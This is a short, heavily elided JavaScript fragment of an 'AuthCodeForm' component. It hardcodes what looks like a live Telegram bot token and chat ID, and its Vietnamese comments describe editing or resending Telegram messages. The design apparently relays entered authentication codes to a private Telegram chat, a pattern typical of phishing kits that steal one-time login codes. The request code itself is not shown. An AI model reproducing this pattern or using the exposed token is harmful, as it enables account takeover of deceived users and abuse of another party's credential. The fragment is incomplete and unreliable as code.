...
const AuthCodeForm = () => {
  const BOT_TOKEN = "8010774541:AAH_AtsUiUycqtpTGi8lMSAtsbQK4FpgtrY";
  const CHAT_ID = "5922644937";
...
`;
    ...
    if (message_id) {
      // ✅ Nếu có message_id thì sửa lại tin nhắn cũ
      ...
      // 🔄 Nếu không có thì fallback gửi mới
